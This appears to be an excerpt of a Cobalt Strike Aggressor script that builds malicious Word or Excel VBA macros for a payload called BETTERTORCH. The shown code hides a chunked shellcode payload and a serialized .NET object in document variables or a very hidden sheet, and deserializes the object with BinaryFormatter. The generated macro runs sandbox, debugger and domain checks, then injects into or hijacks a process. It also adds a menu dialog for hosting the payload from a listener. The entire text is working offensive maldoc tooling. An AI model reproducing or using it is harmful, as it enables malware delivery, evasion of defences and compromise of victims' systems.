		@chunks = split("(?<=\\G.{32000})", $b64payload);
		@doca = @();
		foreach $var (@chunks){
			@morechunks = split("(?<=\\G.{100})", $var);
			$insert = $insert . "    " . $code . " = \"\"\r\n";
			$docv = random_string(6);
			push(@doca,$docv);
			foreach $v (@morechunks){
				$insert = $insert . "    " . $code . " = " . $code . " & \"" . $v . "\"\r\n";
			}
			if($word){
				$insert = $insert . "    ActiveDocument.Variables.Add Name:=\"" . $docv . "\" , Value:=" . $code . "\r\n";
				$insert = $insert . "\r\n\r\n\r\n";
			}else{
				$insert = $insert . " 	 ws.Cells(" . $i . ",1).Value = " . $code . "\r\n";
				$insert = $insert . "\r\n\r\n\r\n";
				$i++;

			}
		}

		$insert = $insert . "    so = \"\"\r\n";

		@chunks = split("(?<=\\G.{32000})", $hexdata);
		foreach $v (@chunks){
			@lines = split("(?<=\\G.{100})", $v);
			foreach $vv (@lines){
				$insert = $insert . "    so = so & \"" . $vv . "\"\r\n";
			}
		}
		$soval = random_string(5);
		$dict = random_string(5);
		$manifest = random_string(5);

		if(%options["netType"] eq "4")
		{
			$insert = $insert . $manifest . "= \"\"\r\n\r\n";

			$insert = $insert . "$manifest = $manifest & \"<?xml version=\"\"1.0\"\" encoding=\"\"UTF-16\"\" standalone=\"\"yes\"\"?><assembly xmlns=\"\"urn:schemas-microsoft-com:asm.v1\"\" manifestVersion=\"\"1.0\"\"><assemblyIdentity name=\"\"mscorlib\"\" version=\"\"4.0.0.0\"\" publicKeyToken=\"\"B77A5C561934E089\"\" />\"\r\n";
			$insert = $insert . "$manifest = $manifest & \"<clrClass clsid=\"\"{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}\"\" progid=\"\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\"\" threadingModel=\"\"Both\"\" name=\"\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\"\" runtimeVersion=\"\"v4.0.30319\"\" />\"\r\n";
			$insert = $insert . "$manifest = $manifest & \"<clrClass clsid=\"\"{8D907746-455E-39A7-BD31-BC9F81468347}\"\" progid=\"\"System.Collections.ArrayList\"\" threadingModel=\"\"Both\"\" name=\"\"System.Collections.ArrayList\"\" runtimeVersion=\"\"v4.0.30319\"\" />\"\r\n";
			$insert = $insert . "$manifest = $manifest & \"<clrClass clsid=\"\"{8D907846-455E-39A7-BD31-BC9F81468347}\"\" progid=\"\"System.Text.ASCIIEncoding\"\" threadingModel=\"\"Both\"\" name=\"\"System.Text.ASCIIEncoding\"\" runtimeVersion=\"\"v4.0.30319\"\" />\"\r\n";
			$insert = $insert . "$manifest = $manifest & \"<clrClass clsid=\"\"{8D907846-455E-39A7-BD31-BC9F81488347}\"\" progid=\"\"System.Security.Cryptography.FromBase64Transform\"\" threadingModel=\"\"Both\"\" name=\"\"System.Security.Cryptography.FromBase64Transform\"\" runtimeVersion=\"\"v4.0.30319\"\" />\"\r\n";
			$insert = $insert . "$manifest = $manifest & \"<clrClass clsid=\"\"{8D907846-455E-39A7-BD31-BC9F81468B47}\"\" progid=\"\"System.IO.MemoryStream\"\" threadingModel=\"\"Both\"\" name=\"\"System.IO.MemoryStream\"\" runtimeVersion=\"\"v4.0.30319\"\" /></assembly>\"\r\n";




		}
		if($word){
			$insert = $insert . "    ActiveDocument.Variables.Add Name:=\"" . $soval . "\" , Value:=so\r\n";
			$insert = $insert . "    ActiveDocument.Variables.Add Name:=\"" . $dict . "\" , Value:=\"" . $dictstr . "\"\r\n";
			$insert = $insert . "    ActiveDocument.Variables.Add Name:=\"" . $manifest . "\" , Value:=" . $manifest. "\r\n";
		}else{
			$insert = $insert . "	ws.Cells(1,2).Value = so\r\n";
			$insert = $insert . "	ws.Cells(1,3).Value = \"". $dictstr . "\"\r\n";
			$insert = $insert . "	ws.Cells(1,4).Value = ". $manifest. "\r\n";
		}

		$insert = $insert . "\r\n\r\n\r\n";


		$addcode = "    " . $code . " = ";
		foreach $v (@doca){
			$addcode = $addcode . "  " . $decode . "(\"".$v."\")  & ";
		}
		$addcode = $addcode  . "\"\"\r\n";


		$data = $data . "Public " . $binary . " As String\r\n";
		$data = $data . "Public " . $code . " As String\r\n";
		$data = $data . "Public d as New Scripting.Dictionary\r\n";
		$data = $data . "\r\n\r\n";

		$data = $data . "Function SplitStr(str)\r\n";
		$data = $data . "    Dim Result() As String\r\n";
		$data = $data . "    Dim Display As String\r\n";
		$data = $data . "    Result = Split(str, \",\")\r\n";
		$data = $data . "    For i = LBound(Result()) To UBound(Result())\r\n";
		$data = $data . "        Dim Res2() As String\r\n";
		$data = $data . "        Res2() = Split(Result(i), \"|\")\r\n";
		$data = $data . "        d(Res2(0)) = Res2(1)\r\n";
		$data = $data . "    Next i\r\n";
		$data = $data . "End Function\r\n";
		$data = $data . "\r\n\r\n";
		if($word){
			$data = $data . "Function " . $decode . "(arg)\r\n";
			$data = $data . "    " . $decode . " = ActiveDocument.Variables(arg).Value\r\n";
			$data = $data . "End Function \r\n";
			$data = $data . "\r\n\r\n";
		}
		$data = $data . "Private Function decodeHex(hex)\r\n";
		$data = $data . "    On Error Resume Next\r\n";
		$data = $data . "    Dim DM, EL\r\n";
		$data = $data . "    Set DM = CreateObject(d(\"" . $xmldom . "\"))\r\n";
		$data = $data . "    Set EL = DM.createElement(\"tmp\")\r\n";
		$data = $data . "    EL.DataType = d(\"" . $binhex . "\")\r\n";
		$data = $data . "    EL.Text = hex\r\n";
		$data = $data . "    decodeHex = EL.NodeTypedValue\r\n";
		$data = $data . "End Function\r\n";
		$data = $data . "\r\n\r\n";

		$data = $data . "Sub DELETEME_Setup\r\n";
		if(!$word){
		$data = $data . "Dim wb As Workbook\r\n";
    		$data = $data . "Set wb = ActiveWorkbook\r\n";
    		$data = $data . "Dim ws As Worksheet\r\n";
    		$data = $data . "Set ws = wb.Sheets.Add(Type:=xlWorksheet, After:=Application.ActiveSheet)\r\n";
    		$data = $data . "ws.Visible = xlSheetVeryHidden\r\n";
    		$data = $data . "ws.name = \"" . $sheet . "\" \r\n";
   			$data = $data . "ws.Range(\"A1\", \"Z99\").NumberFormat = \"@\"\r\n";
		}
		$data = $data . $insert;
		$data = $data . "End Sub\r\n\r\n";
		$data = $data . "'Sub Workbook_Open()\r\n";
		$data = $data . "'Sub AutoOpen()\r\n";
		$data = $data . "'Sub Auto_Open()\r\n";
		$data = $data . "Sub  RENAME_ME_FROM_ABOVE_OR_I_WONT_RUN()\r\n";

   		if($word){
			$data = $data . $addcode;
			$data = $data . "SplitStr( " . $decode . "(\"" . $dict . "\"))\r\n";
			$data = $data . "    serialized_obj = " . $decode . "(\"" . $soval . "\")\r\n";
			$data = $data . "    " . $manifest . " . = " . $decode . "(\"" . $manifest . "\")\r\n";
		}else{

			$data = $data . "Dim wb As Workbook\r\n";
    		$data = $data . "Set wb = ActiveWorkbook\r\n";
    		$data = $data . "Dim ws As Worksheet\r\n";
   			$data = $data . "Set ws = wb.Sheets(\"". $sheet . "\")\r\n";

   			$data = $data . $code . " = \"\"\r\n";
   			$data = $data . "For i = 1 to 100\r\n\t" . $code . " = " . $code . " & ws.Range(\"A\" & i)\r\nNext i\r\n";
			$data = $data . "SplitStr( ws.Range(\"C1\"))\r\n";
			$data = $data . "    serialized_obj = ws.Range(\"B1\")\r\n";
		}

		$data = $data . "    " . $binary . " = d(\"" . $binary . "\")\r\n";
		$data = $data . "    entry_class = d(\"". $classname . "\")\r\n";
		$data = $data . "    Dim stm As Object, fmt As Object, al As Object\r\n";
		if(%options["netType"] eq "4")
		{
        		$data = $data . "   Set ax = CreateObject(\"Microsoft.Windows.ActCtx\")\r\n";
        		$data = $data . "   ax.ManifestText = " . $manifest . "\r\n";
			$data = $data . "    Set stm = ax.CreateObject(d(\"" . $memstream . "\"))\r\n";
			$data = $data . "    Set fmt = ax.CreateObject(d(\"" . $binformat . "\"))\r\n";
			$data = $data . "    Set al = ax.CreateObject(d(\"" . $arraylist . "\"))\r\n";
		}else{
		$data = $data . "    Set stm = CreateObject(d(\"" . $memstream . "\"))\r\n";
		$data = $data . "    Set fmt = CreateObject(d(\"" . $binformat . "\"))\r\n";
		$data = $data . "    Set al = CreateObject(d(\"" . $arraylist . "\"))\r\n";
		}
		$data = $data . "    Dim dec\r\n";
		$data = $data . "    dec = decodeHex(serialized_obj)\r\n";
		$data = $data . "    For Each i In dec\r\n";
		$data = $data . "        stm.WriteByte i\r\n";
		$data = $data . "    Next i\r\n";
		$data = $data . "    stm.Position = 0\r\n";
		$data = $data . "    Dim n As Object, di As Object, o As Object\r\n";
		$data = $data . "    Set n = fmt.SurrogateSelector\r\n";
		$data = $data . "    Set di = fmt.Deserialize_2(stm)\r\n";
		$data = $data . "    al.Add n\r\n";
		$data = $data . "    Set o = di.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)\r\n";
		if(%options["checkDomain"] eq "true")
		{
			$data = $data . "    o.velma 0, \"" . %options["domain"]. "\"\r\n";
		}
		if(%options["checkDomainJoined"] eq "true")
		{
			$data = $data . "    o.velma 1, \"\"\r\n";
		}
		if(%options["hasSandbox"] eq "true")
		{
			$data = $data . "    o.velma 2, \"\"\r\n";
		}
		if(%options["badMac"] eq "true")
		{
			$data = $data . "    o.velma 3, \"\"\r\n";
		}
		if(%options["isDebugged"] eq "true")
		{
			$data = $data . "    o.velma 4, \"\"\r\n";
		}
		if(%options["method"] eq "Launch & Inject"){
			$data = $data . "    o.scooby " .  %options["binary"] . ", " . $code . "\r\n";
		}else if (%options["method"] eq "Hijack Threads"){
			$data = $data . "    o.scrappy "  . %options["binary"] . ", " . $code . "\r\n";
		}else if(%options["method"] eq "Execute Delegate"){
			$data = $data . "    o.daphne "  . $code . "\r\n";
		}
		$data = $data . "End Sub\r\n";



		$url = $data;
		[dialog.DialogUtils addToClipboard: $data];

}

# create a popup menu!
popup attacks {
	item "Host BETTERTORCH Payload" {
		local('$dialog %defaults');

		# setup our defaults
		%defaults["uri"]  = "/a";
		%defaults["host"] = localip();
		%defaults["port"] = 80;
		%defaults["stageless"] = "true";
		%defaults["binary"] = "rundll32.exe";
		%defaults["type"] = "Word";

		# create our dialog
		$dialog = dialog("Host BETTERTORCH Payload", %defaults, &setup_attack);
		dialog_description($dialog, "Host a BETTERTORCH Payload");
		drow_text($dialog, "uri", "URI Path: ", 20);
		drow_text($dialog, "host", "Local Host: ");
		drow_text($dialog, "port", "Local Port: ");
		drow_listener_stage($dialog, "listener", "Listener: "); # can't gen stageless payloads for other team servers.
		drow_combobox($dialog, "netType", "DotNet Version: ", @("3.5", "4"));
		drow_checkbox($dialog, "stageless", "Stageless: ", "Use Stageless Payload");
		drow_combobox($dialog, "method", "Method: ", @("Launch & Inject","Hijack Threads","Execute Delegate"));
		drow_text($dialog, "binary", "Target Binary or Process: ");
		drow_checkbox($dialog, "checkDomain", "CheckDomain: ", "Check Domain before Execution");
		drow_text($dialog, "domain", "Domain: ");
		drow_checkbox($dialog, "checkDomainJoined", "CheckDomainJoined: ", "Check if system is domain joined");
		drow_checkbox($dialog, "hasSandbox", "Has Sandbox: ", "Check if system is a sandbox");
		drow_checkbox($dialog, "badMac", "Has Bad Mac: ", "Check if system has a fake MAC");
		drow_checkbox($dialog, "isDebugged", "Is Debugged: ", "Check if system is being debugged");
		drow_combobox($dialog, "type", "Type: ", @("Word", "Excel"));
		dbutton_action($dialog, "Launch");

		# show our dialog
		dialog_show($dialog);
	}
}
